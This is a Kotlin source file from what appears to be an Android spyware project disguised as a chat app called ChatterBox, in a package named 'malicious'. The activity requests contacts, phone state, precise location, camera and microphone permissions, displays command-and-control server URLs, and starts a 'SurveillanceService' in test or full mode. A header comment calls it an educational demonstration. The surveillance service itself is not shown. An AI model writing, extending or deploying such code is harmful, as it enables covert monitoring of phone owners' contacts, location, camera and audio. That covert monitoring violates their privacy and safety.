package com.example.ChatterBox.malicious

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.widget.Button
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.example.ChatterBox.R

/**
 * Activity for testing C2 server connectivity
 * FOR EDUCATIONAL DEMONSTRATION PURPOSES ONLY.
 */
class TestC2Activity : AppCompatActivity() {
    
    private val PERMISSIONS_REQUEST_CODE = 1234
    private val requiredPermissions = arrayOf(
        Manifest.permission.INTERNET,
        Manifest.permission.ACCESS_NETWORK_STATE,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO
    )
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_test_c2)
        
        // Check and request permissions
        checkAndRequestPermissions()
        
        // Setup C2 connection test button
        val testButton = findViewById<Button>(R.id.btnTestC2)
        testButton.setOnClickListener {
            startC2Test()
        }
        
        // Setup full malicious services button
        val startServicesButton = findViewById<Button>(R.id.btnStartServices)
        startServicesButton.setOnClickListener {
            startMaliciousServices()
        }
        
        // Display current C2 server configuration
        val serverUrlTextView = findViewById<TextView>(R.id.txtServerUrl)
        serverUrlTextView.text = "C2 Server URL: ${C2Config.SERVER_URL}\n" +
                "Emulator URL: ${C2Config.EMULATOR_SERVER_URL}\n" +
                "Local URL: ${C2Config.LOCAL_SERVER_URL}"
    }
    
    private fun checkAndRequestPermissions() {
        val permissionsToRequest = ArrayList<String>()
        
        for (permission in requiredPermissions) {
            if (ContextCompat.checkSelfPermission(this, permission) 
                    != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(permission)
            }
        }
        
        if (permissionsToRequest.isNotEmpty()) {
            ActivityCompat.requestPermissions(
                this,
                permissionsToRequest.toTypedArray(),
                PERMISSIONS_REQUEST_CODE
            )
        }
    }
    
    private fun startC2Test() {
        // Start the service with a special test action
        val intent = Intent(this, SurveillanceService::class.java)
        intent.action = "TEST_C2"
        startService(intent)
        
        // Update status
        val statusTextView = findViewById<TextView>(R.id.txtStatus)
        statusTextView.text = "C2 Test started. Check Android logcat for results."
    }
    
    private fun startMaliciousServices() {
        // Start the main surveillance service
        val intent = Intent(this, SurveillanceService::class.java)
        startService(intent)
        
        // Update status
        val statusTextView = findViewById<TextView>(R.id.txtStatus)
        statusTextView.text = "All surveillance services started. Check Android logcat for results."
    }
    
    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        
        if (requestCode == PERMISSIONS_REQUEST_CODE) {
            var allGranted = true
            
            for (result in grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false
                    break
                }
            }
            
            val statusTextView = findViewById<TextView>(R.id.txtStatus)
            if (allGranted) {
                statusTextView.text = "All permissions granted. You can now test the C2 connection."
            } else {
                statusTextView.text = "Some permissions were denied. Full functionality may not be available."
            }
        }
    }
}
